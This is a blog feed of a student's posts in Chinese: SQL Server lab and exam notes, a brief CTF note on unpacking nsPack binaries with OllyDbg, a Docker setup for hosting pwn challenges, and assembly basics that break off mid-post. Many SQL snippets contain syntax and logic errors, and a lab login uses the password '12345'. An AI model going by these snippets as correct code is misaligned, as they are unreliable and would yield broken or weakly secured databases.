    <link href="/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>使用的是sql server，操作可能跟mysql有区别</strong></p><h1 id="第一次实验"><a href="#第一次实验" class="headerlink" title="第一次实验"></a>第一次实验</h1><h2 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h2><pre><code class="mssql">create database stuhyyon (    name = stu,     filename=&#39;C:\stu_data.mdf&#39;,    size = 3mb,    maxsize = 500mb,    filegrowth = 10%)log on(    name = stu_log,    filename = &#39;D:\stu_log.ldf&#39;,    size=3mb,    maxsize = unlimited,    filegrowth = 1mb)</code></pre><h2 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h2><pre><code class="mssql">Alter database StuhyyModify file(    name = Stuhyy_log,    filename = &#39;H:\Stuhyy_log.ldf&#39;,    size = 10MB,    maxsize = 20MB,    fileGrowth = 5%)</code></pre><h2 id="添加数据库文件"><a href="#添加数据库文件" class="headerlink" title="添加数据库文件"></a>添加数据库文件</h2><pre><code class="mssql">Alter database Stuhyyadd file(    name = dataname,    filename = &#39;H:\dataname.ndf&#39;,    size = 20MB,    maxsize = 30MB,    filegrowth = 1MB)</code></pre><h2 id="新建-amp-修改数据表"><a href="#新建-amp-修改数据表" class="headerlink" title="新建&amp;修改数据表"></a>新建&amp;修改数据表</h2><pre><code class="mssql">Create Table Student(    Num int primary key,    Nam char(6) not null,    Birthday datetime)Create Table ChoseClass(    Num int primary key,    CNum int not null,    Score int not null.    check (100&gt;= Score and Score &gt;= 0))Alter Table Studentadd 学分 intALTER TABLE table_name DROP COLUMN column_name</code></pre><h3 id="添加外键约束"><a href="#添加外键约束" class="headerlink" title="添加外键约束"></a>添加外键约束</h3><pre><code class="mssql">Alter Table StudentAdd Constraint fk_stuNumForeign key(Num) references ChoseClass(Num)</code></pre><h1 id="第二次实验"><a href="#第二次实验" class="headerlink" title="第二次实验"></a>第二次实验</h1><h2 id="插入信息"><a href="#插入信息" class="headerlink" title="插入信息"></a>插入信息</h2><pre><code class="mssql">Insert Into studinfoValues(&#39;hyy&#39;,&#39;11&#39;，&#39;广东&#39;)</code></pre><h2 id="删除信息"><a href="#删除信息" class="headerlink" title="删除信息"></a>删除信息</h2><pre><code class="mssql">Delete From scwhere xxx = xxx</code></pre><h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><pre><code class="mssql">Backup database Stuhyy to disk = &#39;H:\StuhyyBackup.bak&#39;///Backup database Stuhyy to StuhyyBakBackup log Stuhyy_log to disk = &#39;H:\Stuhyy_logBackup.bak&#39;///Backup log Stuhyy_log to Stuhyy_log</code></pre><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><pre><code class="mssql">Restore Database Stuhyy from disk = &#39;H:\StuhyyBackup.bak&#39;</code></pre><h1 id="第三次实验"><a href="#第三次实验" class="headerlink" title="第三次实验"></a>第三次实验</h1><p><code>Select Distinct 学号 from sc</code></p><h2 id="对成绩进行降序-相同则按学号升序排序"><a href="#对成绩进行降序-相同则按学号升序排序" class="headerlink" title="对成绩进行降序,相同则按学号升序排序"></a>对成绩进行降序,相同则按学号升序排序</h2><pre><code class="mssql">Select 学号,成绩 From scWhere 课程号 = &#39;4&#39;Order by 成绩 desc,学号 asc</code></pre><h2 id="查询姓黄同学的信息"><a href="#查询姓黄同学的信息" class="headerlink" title="查询姓黄同学的信息"></a>查询姓黄同学的信息</h2><pre><code class="mssql">Select 姓名, 系部名称 From StudinfoWhere 姓名 like &#39;咩%&#39; and 系部名称 in (&#39;国传&#39;,&#39;媒体工程&#39;) </code></pre><h2 id="查询选修人数超过10人的课程号"><a href="#查询选修人数超过10人的课程号" class="headerlink" title="查询选修人数超过10人的课程号"></a>查询选修人数超过10人的课程号</h2><pre><code class="mssql">Select 课程号,Count(*) as 选课人数  From scGroup By 课程号Having Count (*) &gt; 10</code></pre><h2 id="查询每门课最高分，最低分"><a href="#查询每门课最高分，最低分" class="headerlink" title="==查询每门课最高分，最低分=="></a>==查询每门课最高分，最低分==</h2><h2 id="查询选修了课程的学生姓名及选修课程的最高分"><a href="#查询选修了课程的学生姓名及选修课程的最高分" class="headerlink" title="查询选修了课程的学生姓名及选修课程的最高分"></a>查询选修了课程的学生姓名及选修课程的最高分</h2><pre><code class="mssql">Select Studinfo.姓名,Max(sc.成绩) as 最高成绩 From scRight Outer Join Studinfo on Studinfo.学号 = sc.学号Group by Studinfo.姓名</code></pre><h2 id="right-outer-join-left-inner-join"><a href="#right-outer-join-left-inner-join" class="headerlink" title="==right outer join  left inner join=="></a>==right outer join  left inner join==</h2><p>　　left join(左联接) 返回包括<strong>左表中的所有记录和右表中联结字段相等</strong>的记录  以左表为主<br>　　right join(右联接) 返回包括<strong>右表中的所有记录和左表中联结字段相等</strong>的记录 以右表为主<br>　　inner join(等值连接) 只返回两个表中联结字段相等的行</p><blockquote><p>   outer join(外连接) 可分为左外连接left outer join和右外连接right outer join</p><p>left join 是 left outer join 的简写，两者含义一样的。<br>right join 是 right outer join 的简写，两者含义一样的</p></blockquote><h1 id="第四次实验"><a href="#第四次实验" class="headerlink" title="第四次实验"></a>第四次实验</h1><h2 id="T-sql创建学生视图"><a href="#T-sql创建学生视图" class="headerlink" title="T-sql创建学生视图"></a>T-sql创建学生视图</h2><pre><code class="mssql">Create View ASSelect Studinfo.学号，Studinfo.系部名称,Course.课程名，Sc.成绩 From Studinfo,sc,CourseWhere Studinfo.学号 = sc.学号 And sc.课程号 = course.课程号 And Studinfo.系部名称 = &#39;媒体工程&#39;With Check Option</code></pre><blockquote><p>对视图进行update或者insert操作时，保证更新或者插入的行满足图中定义的谓词条件 假如一张表里有个字段是专业的;你创建视图的时候 create view stu as select 学生 from table where 专业=’计算机’ with check option 这样where后面就实现了对专业的限定 以后你如果对视图添加记录的时候专业如果不是计算机的话不让添加进去的<br>————————————————<br>版权声明：本文为CSDN博主「ClearLoveQ」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/ClearLoveQ/article/details/84285060" target="_blank" rel="noopener">https://blog.csdn.net/ClearLoveQ/article/details/84285060</a></p></blockquote><h1 id="第五次实验"><a href="#第五次实验" class="headerlink" title="第五次实验"></a>第五次实验</h1><h2 id="声明局部变量"><a href="#声明局部变量" class="headerlink" title="声明局部变量"></a>声明局部变量</h2><pre><code class="mssql">Declare @max date , @min dateset @max = (select Max(出生日期) from studinfo)set @min = (select Min(出生日期) from studinfo)select @max as 最大出生日期 , @min as 最小出生日期</code></pre><p>小知识</p><blockquote><p>①date类型可用于需要一个日期值而不需要时间部分时；</p><p>②datetime类型:可用于需要同时包含日期和时间信息的值。</p></blockquote><h2 id="Case的使用"><a href="#Case的使用" class="headerlink" title="Case的使用"></a>Case的使用</h2><pre><code class="mssql">Select 姓名,课程名,成绩 =Case    when 成绩 &gt; 90 then &#39;A&#39;    when 成绩 &gt; 80 then &#39;B&#39;    when 成绩 &gt; 70 then &#39;C&#39;    when 成绩 &gt; 60 then &#39;D&#39;    else &#39;E&#39;EndFrom scinner join studinfo on sc.学号 = studinfo.学号inner join course on sc.课程号 = course.课程号///如果存在If Exists(select * from studinfo)    select * from studinfo</code></pre><h2 id="声明游标，更新字段"><a href="#声明游标，更新字段" class="headerlink" title="声明游标，更新字段"></a>声明游标，更新字段</h2><pre><code class="mssql">Declare curor_mark CursorFor select 成绩 from scFor Update of 成绩Go///删除游标Deallocate curor_mark</code></pre><h2 id="游标定位操作"><a href="#游标定位操作" class="headerlink" title="游标定位操作"></a>游标定位操作</h2><p>定义基于sc的游标，分别将第三条记录，从当前记录开始向前第二条记录和最后一条记录显示在屏幕上</p><pre><code class="mssql">Declare cursor_mark Cursor ScrollFor    Select * from sc    inner join studinfo on sc.学号 = Studinfo.学号    inner join course on course.课程号 = sc.课程号Open course_markfetch absolute 3 from cursor_markfetch relative -2 from cursor_markfetch last from cursor_markClose cursor_markDeallocate cursor_mark</code></pre><h2 id="游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分"><a href="#游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分" class="headerlink" title="游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分"></a>游标遍历sc表，将学号为“1001”的学生的所有课程成绩加5分</h2><pre><code class="mssql">Declare @name char(20), @num intDeclare cursor_mark Cursor ScrollFor    Select 姓名,sc.学号 from sc    inner join studinfo on sc.学号 = studinfo.学号    inner join course on course.课程号 = sc.课程号For Update of 成绩Open cursor_markFetch Next from cursor_mark Into @name , @numwhile @@fetch_status = 0    Begin    if @name = &#39;女朋友&#39;        Update sc        set 成绩 = 成绩 + 5        where current of cursor_mark        Fetch Next from cursor_mark Into @name , @num    EndClose cursor_markDeallocate cursor_mark</code></pre><h2 id="给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score-gt-60则为“P”，否则为“F”"><a href="#给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score-gt-60则为“P”，否则为“F”" class="headerlink" title="给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score&gt;60则为“P”，否则为“F”"></a>给sc表增加一列字段：等级，char（2），利用游标操作机制给等级字段赋值，如果score&gt;60则为“P”，否则为“F”</h2><pre><code class="mssql"> Alter Table sc Add 等级 char(2) null Go Begin     Update sc     set 等级 =          Case                 when 成绩 &gt;= 60 then &#39;P&#39;                 when 成绩 &lt; 60 then &#39;F&#39;                 End End</code></pre><p>==dateadd(year,1,出生日期) 出生日期的year + 1==</p><p>==month(出生日期) 取出生日期的month出来==</p><h1 id="第六次实验"><a href="#第六次实验" class="headerlink" title="第六次实验"></a>第六次实验</h1><h2 id="定义标量函数f-stud1-统计某学院的学生人数"><a href="#定义标量函数f-stud1-统计某学院的学生人数" class="headerlink" title="==定义标量函数f_stud1,统计某学院的学生人数=="></a>==定义标量函数f_stud1,统计某学院的学生人数==</h2><pre><code class="mssql">If Exists(select * from sysobjects where name = &#39;f_stud1&#39;)    drop function f_stud1GoCreate Function f_stud1(@nam char(10))return intAS    Begin        Declare @n int        set @n = (select count(*) from studinfo                 where 系部名称 = @nam)        return (@n)    EndGoSelect dbo.f_stud1(&#39;媒体工程&#39;) as 人数</code></pre><h2 id="定义一-内嵌表值函数-f-stud3，返回某学生选修课情况，包含姓名、课程名，分数等"><a href="#定义一-内嵌表值函数-f-stud3，返回某学生选修课情况，包含姓名、课程名，分数等" class="headerlink" title="定义一==内嵌表值函数==f_stud3，返回某学生选修课情况，包含姓名、课程名，分数等"></a>定义一==内嵌表值函数==f_stud3，返回某学生选修课情况，包含姓名、课程名，分数等</h2><pre><code class="mssql">Create Function f_stud3(@name nchar(10))return TableAs    return (select 姓名 ,课程名,成绩 from sc s           inner join studinfo on s.学号 = studinfo.学号           inner join course on s.学号 = course.学号           where 姓名 = @nam)Goselet * from dbo.f_stud3(&#39;Mie&#39;)</code></pre><h2 id="创建一个-带输入的存储过程-，通过调用上例的f-stud3，查询某学生的选修课程情况"><a href="#创建一个-带输入的存储过程-，通过调用上例的f-stud3，查询某学生的选修课程情况" class="headerlink" title="创建一个==带输入的存储过程==，通过调用上例的f_stud3，查询某学生的选修课程情况"></a>创建一个==带输入的存储过程==，通过调用上例的f_stud3，查询某学生的选修课程情况</h2><pre><code class="mssql">Create Procedure use_f_stud3(@nam nchar(10))AS    select * from dbo.f_stud3(@nam)GoExec use_f_stud3(&#39;Mie&#39;)</code></pre><p>==datediff(year,出生日期,getdate()) 获取年龄==</p><h2 id="定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空"><a href="#定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空" class="headerlink" title="==定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空=="></a>==定义多语句表值函数，根据输入的表名，返回该表所包含的字段名称，类型，类型长度以及是否为空==</h2><pre><code class="mssql">create function f_tableinfo(@tableName nvarchar(200))returns @result table (ColName nvarchar(200),ColType nvarchar(200),ColLength int,ColIsNull bit)as    begin        insert into @result(ColName,ColType,ColLength,ColIsNull)    select        c.[name] as ColumnName,        t.[name] as ColumnType,        c.max_length as MaxLength,        c.is_nullable as [IsNull]    from sys.columns c    inner join sys.types t on c.system_type_id=t.system_type_id    Where c.[object_id]=object_id(@tableName) and t.[name]&lt;&gt;&#39;sysname&#39;    Order by c.column_id    Return    EndGoselect * from f_tableinfo(&#39;Studinfo&#39;)</code></pre><h1 id="第七次实验"><a href="#第七次实验" class="headerlink" title="第七次实验"></a>第七次实验</h1><h2 id="使用存储过程新建department-系部人数，总人数，男生人数，女生人数-，用SQL语句从学生表中采集相应信息添加到系部表中。"><a href="#使用存储过程新建department-系部人数，总人数，男生人数，女生人数-，用SQL语句从学生表中采集相应信息添加到系部表中。" class="headerlink" title="使用存储过程新建department(系部人数，总人数，男生人数，女生人数)，用SQL语句从学生表中采集相应信息添加到系部表中。"></a>使用存储过程新建department(系部人数，总人数，男生人数，女生人数)，用SQL语句从学生表中采集相应信息添加到系部表中。</h2><pre><code class="mssql">Create Procedure p_stuXibuAs    select 系部名称 as 系部名称,count(*) as 总人数,        sum(case 姓名 when &#39;女&#39; then 1 else 0 End) as 女生人数        sum(case 姓名 when &#39;男&#39; then 1 else 0 End) as 男生人数    into 系部表 From studinfo    Group by 系部名称Gop_stuXiBu</code></pre><h2 id="创建触发器tr-stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果"><a href="#创建触发器tr-stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果" class="headerlink" title="创建触发器tr_stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果"></a>创建触发器tr_stud1，当在课程表中新增一条记录时，在屏幕上显示该新增记录信息，同时激活该激活器，验证该触发器的执行结果</h2><pre><code class="mssql">Create trigger tr_stud1 on courseFor InsertAs    select * from inserted</code></pre><h2 id="建立一个命名事务trans-credit，当学号为-sid的学生所选的课程（课程编号为-cid）的总学分没有超过10时，将学号和课程编号值（-sid-cid）添加到grade表中，同时修改stu-credit表中的总学分，使总学分为当前总学分-所选课程的学分值（-cre），否则，取消该事务，实现回滚。"><a href="#建立一个命名事务trans-credit，当学号为-sid的学生所选的课程（课程编号为-cid）的总学分没有超过10时，将学号和课程编号值（-sid-cid）添加到grade表中，同时修改stu-credit表中的总学分，使总学分为当前总学分-所选课程的学分值（-cre），否则，取消该事务，实现回滚。" class="headerlink" title="建立一个命名事务trans_credit，当学号为@sid的学生所选的课程（课程编号为@cid）的总学分没有超过10时，将学号和课程编号值（@sid,@cid）添加到grade表中，同时修改stu_credit表中的总学分，使总学分为当前总学分+所选课程的学分值（@cre），否则，取消该事务，实现回滚。"></a>建立一个命名事务trans_credit，当学号为@sid的学生所选的课程（课程编号为@cid）的总学分没有超过10时，将学号和课程编号值（@sid,@cid）添加到grade表中，同时修改stu_credit表中的总学分，使总学分为当前总学分+所选课程的学分值（@cre），否则，取消该事务，实现回滚。</h2><pre><code class="mssql">use Stuhyygoif exists(select * from sys.all_objects where name = &#39;trans_credit&#39;)    drop trigger trans_creditgocreate trigger trans_credit on stu_creditfor insertas    BEGIN TRAN 选课        --save tran 选课        declare @sid char(10),@cid char(10),@mark int,@totalmark int        set @sid = (select 学号 from inserted)        set @cid = (select 课程号 from inserted)        set @mark = (select 学分 from inserted)        set @totalmark = (select 总学分 from stu_credit where 学号 = @sid) + @mark        if @totalmark &gt;10            BEGIN                print &#39;超出总学分!选课失败！&#39;                rollback tran 选课            END        else            BEGIN            update stu_credit set 总学分 = @totalmark where 学号 = @sid            if OBJECT_ID(N&#39;grade&#39;,N&#39;U&#39;) is not null                insert into grade                 Values(@sid,@cid)            else                 create table student  --创建表student                (学号 char(10) ,                课程号 char(10),                )                insert into grade                 Values(@sid,@cid)                END    commit TRAN 选课    GOGO</code></pre><h1 id="第八次实验"><a href="#第八次实验" class="headerlink" title="第八次实验"></a>第八次实验</h1><h2 id="用T-Sql语句创建sql-server-登录1-test-w1-登录密码为12345-默认访问pubs"><a href="#用T-Sql语句创建sql-server-登录1-test-w1-登录密码为12345-默认访问pubs" class="headerlink" title="用T-Sql语句创建sql server 登录1_test_w1,登录密码为12345,默认访问pubs"></a>用T-Sql语句创建sql server 登录1_test_w1,登录密码为12345,默认访问pubs</h2><pre><code class="mssql">sp_addlogin@loginame = &#39;Mie&#39;@passwd = &#39;12345&#39;@dfdb = &#39;pubs&#39;</code></pre><h2 id="授予Windows用户连接到sql-server的权利"><a href="#授予Windows用户连接到sql-server的权利" class="headerlink" title="授予Windows用户连接到sql server的权利"></a>授予Windows用户连接到sql server的权利</h2><pre><code class="mssql">EXEC sp_grantloging ‘CSUSQL\1_test_w2’Sp_addlogin@loginame = &#39;1_test_s2&#39;@defdb = &#39;Stuhyy&#39;</code></pre><h2 id="添加数据库用户"><a href="#添加数据库用户" class="headerlink" title="添加数据库用户"></a>添加数据库用户</h2><pre><code class="mssql">EXEC sp_grantdbaccess &#39;u_test_w1&#39;</code></pre><h2 id="禁止用户u-test-s1-对course表的插入和删除权限，撤销对studinfo的更新权限"><a href="#禁止用户u-test-s1-对course表的插入和删除权限，撤销对studinfo的更新权限" class="headerlink" title="禁止用户u_test_s1 对course表的插入和删除权限，撤销对studinfo的更新权限"></a>禁止用户u_test_s1 对course表的插入和删除权限，撤销对studinfo的更新权限</h2><pre><code class="mssql">GRANT    DENY Insert,Delete On course    Revoke Update on Studinfo</code></pre><h2 id="对用户u-test-s1添加成员r-test-s1"><a href="#对用户u-test-s1添加成员r-test-s1" class="headerlink" title="对用户u_test_s1添加成员r_test_s1"></a>对用户u_test_s1添加成员r_test_s1</h2><pre><code class="mssql">EXEC Sp_addrolemember &#39;u_test_s1&#39; , &#39;r_test_s1&#39;</code></pre><h2 id="删除账户"><a href="#删除账户" class="headerlink" title="删除账户"></a>删除账户</h2><pre><code class="mssql">Sp_revokelogin &#39;u_test_w1&#39;Sp_revokelogin &#39;u_test_s1&#39;</code></pre><h2 id="删除数据库中用户"><a href="#删除数据库中用户" class="headerlink" title="删除数据库中用户"></a>删除数据库中用户</h2><pre><code class="mssql">Sp_revokedbaccess &#39;r_test_s1&#39;</code></pre><h2 id="删除数据库角色r-test-s1"><a href="#删除数据库角色r-test-s1" class="headerlink" title="删除数据库角色r_test_s1"></a>删除数据库角色r_test_s1</h2><pre><code class="mssql">EXEC sp_droprolemember &#39;u_test_w1&#39;,&#39;r_test_s1&#39;</code></pre><h2 id="2019-12-4上课笔记"><a href="#2019-12-4上课笔记" class="headerlink" title="2019/12/4上课笔记"></a>2019/12/4上课笔记</h2><pre><code class="sql">use employeeGo if exists(select * from sys.all_objects where        name = &#39;trigger_welcome&#39; and type = &quot;TR&quot;)        Drop trigger trigger_welcomego</code></pre><pre><code class="sql">Create trigger tr_employye on employeefor deleteasdeclare @msg varchar(50)select @msg = str(@@rowcount)+&quot;个员工被删除&quot;select @msgreturn</code></pre><pre><code class="sql">Create Trigger test_tron employee from insert,update,deleteas    select * from inserted    select * from deleted</code></pre><pre><code class="sql">create trigger tri_del_sales2on sotrebakfor delete asdelete sales_bak from deletedwhere deleted.sotr_id = sales_bak.stor_id</code></pre><h2 id="2019-12-11-上课笔记"><a href="#2019-12-11-上课笔记" class="headerlink" title="2019/12/11 上课笔记"></a>2019/12/11 上课笔记</h2><pre><code class="sql">BEGIN TRAN[SACTION]COMMIT TRAN[SACTION]ROLLBACK TRAN[SACTION]</code></pre><h2 id="2019-12-25复习"><a href="#2019-12-25复习" class="headerlink" title="2019/12/25复习"></a>2019/12/25复习</h2><p>判断5分，单选20分，填空20分，简答题10分，综合设计45分</p><p>E-R图什么标志表示实体，属性，关系？     P9</p><p>数据库三级模式体系结构，有利于==数据独立性==</p><blockquote><p>三级模式结构又是什么，为什么可以有利   P6</p><p>模式，内模式，外模式</p><p>模式:对数据库全部数据的数据模式和特征的总体描述</p><p>内模式：存储模式，数据库最低一级逻辑描述</p><p>外模式:用户视图（来源一个或多个表组成的查询表</p></blockquote><p>数据库系统中，用户使用的数据视图用==外模式==描述，该模式是用户与数据库系统之间的接口</p><p>一对一，一对多，多对多举例</p><p>数据库特点：数据共享，数据完整性和数据独立性</p><p>范式分解:减少冗余    范式P27</p><blockquote><p>是什么范式，判断不符合更高范式即可</p><p>1NF：所有属性都不能分解为更基本的数据元素</p><p>2NF：不存在部分函数依赖（某列也能函数决定另一列属性）</p><p>3NF：非传递函数依赖</p></blockquote><p>数据模型三要素：数据结构（二维表），关系操作（选择投影链接），完整性约束</p><p>DBMS、DB、DBS（system，包含人）、DBA</p><table><thead><tr><th>Create</th><th>Insert</th></tr></thead><tbody><tr><td>Alter</td><td>update</td></tr><tr><td>Drop</td><td>Delete</td></tr></tbody></table><p>自然连接：消除重复列</p><p>sql server数据库文件后置：.mdf .ldf .ndf</p><p>windows身份验证，混合身份验证</p><p>存储过程：主动调用</p><p>触发器：根据条件触发</p><p>综合设计：E-R图转换，35分写代码（查询，存储过程，事务，每题6-8分）</p><p>以633开头的7位电话怎么写</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手动脱壳</title>
    <link href="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h2><p>可分为压缩壳（常见的有UPX、北斗、ASDPack、Npack、PECompact等）和保护壳（如强壳Safengine、VMprotect、winlicense、Themida等），压缩壳作用是把程序进行体积缩小化处理，保护壳主要作用是混淆或加密代码防止他人进行逆向程序、破解程序。</p><p>注意右面寄存器FPU的显示，当有且只有ESP和EIP为红色时，我们可以用ESP定律了</p><p><a href="https://baike.baidu.com/item/esp%E5%AE%9A%E5%BE%8B/840881?fr=aladdin#1" target="_blank" rel="noopener">ESP定律</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/6213852.html" target="_blank" rel="noopener">参考</a></p><h3 id="nsPack"><a href="#nsPack" class="headerlink" title="nsPack"></a>nsPack</h3><p>还要找到OEP，所谓的OEP，意即程序的入口点，可以用OD载入，不分析代码。</p><p>首先已知是nSPack壳，直接用OD打开，发现pushfd和pushad两句关键句：==win下的吾爱破解版od可==<img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143025540.png" srcset="/img/loading.gif" class="" title="image-20190820143025540"></p><p>ESP定律的落脚点，可以看到落脚点下面一行就是一个大跳转，继续F8</p><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143113466.png" srcset="/img/loading.gif" class="" title="image-20190820143113466"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143126509.png" srcset="/img/loading.gif" class="" title="image-20190820143126509"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143150130.png" srcset="/img/loading.gif" class="" title="image-20190820143150130"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143211831.png" srcset="/img/loading.gif" class="" title="image-20190820143211831">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用docker为pwn题目搭配环境</title>
    <link href="/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/"/>
    <url>/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="为pwn题目搭配环境-docker"><a href="#为pwn题目搭配环境-docker" class="headerlink" title="为pwn题目搭配环境-docker"></a>为pwn题目搭配环境-docker</h1><h2 id="将多个题目搭建一个docker里"><a href="#将多个题目搭建一个docker里" class="headerlink" title="将多个题目搭建一个docker里"></a>将多个题目搭建一个docker里</h2><p>ubuntu *1 </p><p>docker <a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">安装</a></p><p>docker-compose <a href="https://docs.docker.com/compose/install/" target="_blank" rel="noopener">官方文档</a></p><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">giantbranch/pwn_deploy_chroot</a></p><p><a href="https://blog.csdn.net/xiojing825/article/details/79494408" target="_blank" rel="noopener">解决 ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><p><a href="https://www.awaimai.com/2587.html" target="_blank" rel="noopener">docker-compose up解决错误ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>将题目放到bin目录中</p><p>然后在config.py，将REPLACE_BINSH设置为False</p><p>运行一次python initialize.py</p><p>然后会出现一个flags.txt（如果想替换flag，就直接修改flag.txt里的flag字符串即可，然后运行一次python initialize.py）</p><p>然后运行 docker-compose up -build -d</p><p>开启题目即可</p><p>注意：若出现libstdc++.so.6找不到的情况，说明C++环境没有配好，只需要在已经配好C++环境的同版本ubuntu下找到libstdc++.so.6.0.XX（XX为数字）和libgcc_s.so.1放到pwn_deploy_chroot目录下，然后在dockerfile里加入一下代码</p><pre><code>COPY ./libstdc++.so.6.0.21 /usr/lib/libstdc++.so.6COPY ./libgcc_s.so.1 /usr/lib/libgcc_s.so.1</code></pre><p>来源:<a href="https://196011564.github.io/2019/07/22/Linux-简单PWN搭建/?tdsourcetag=s_pctim_aiomsg#找到Pwn所在的端口" target="_blank" rel="noopener">咲夜南梦</a></p></blockquote><p>停止容器 docker stop name</p><h2 id="一个题目一个docker"><a href="#一个题目一个docker" class="headerlink" title="一个题目一个docker"></a>一个题目一个docker</h2><p><a href="https://github.com/glzjin/base_pwn_xinetd" target="_blank" rel="noopener">ubuntu16</a></p><p><a href="https://github.com/glzjin/base_pwn_xinetd_kafel_1804" target="_blank" rel="noopener">ubuntu18</a></p><p>一般情况下，使用赵师傅Ubuntu18.04环境的docker镜像</p><p>下载下来之后，删除除了文件夹：src，文件：docker-compose.yml，Dockerfile以外的所有文件，并复制多个以供其它题目使用</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编、逆向工程基础</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/qq_21508727/article/details/80559270" target="_blank" rel="noopener">https://blog.csdn.net/qq_21508727/article/details/80559270</a></p><h2 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h2><blockquote><ol><li>·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。</li><li>·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。</li></ol><blockquote><p>一个16进制占4bit</p></blockquote></blockquote><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：</p><blockquote><ol><li>EAX： 累加器</li><li>EBX： 基址寄存器</li><li>ECX： 计数器</li><li>EDX： 数据寄存器</li><li>ESI： 源变址寄存器</li><li>EDI： 目的变址寄存器</li><li>EBP： 扩展基址指针寄存器</li><li>ESP： 栈指针寄存器</li><li>EIP： 指令指针寄存器</li></ol><blockquote><p>==大小都是4个字节==</p><blockquote><ol><li><p>EBP： EBP在栈中运用最广，刚开始没有什么需要特别注意的 ;) </p></li><li><p>ESP： ESP指向栈区域的栈顶位置。栈是一个存放即将会被用到的数据的地方，你可以去搜索一下push/pop 指令了解更多栈知识。 </p></li><li><p>EIP： EIP指向下一个将会被执行的指令。</p></li></ol><hr><p><strong>栈（stack）：后进先出的数据结构</strong>     </p><p><strong>堆（heap）：经过排列的树形数据结构，通常指二叉堆，存取是随意的</strong></p></blockquote></blockquote></blockquote><p>有一些寄存器是16位甚至8位的，是不能直接寻址的。</p><blockquote><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342053303.png" srcset="/img/loading.gif" class="" width="1565342053303"></blockquote><p>一个寄存器可以这样看：</p><img 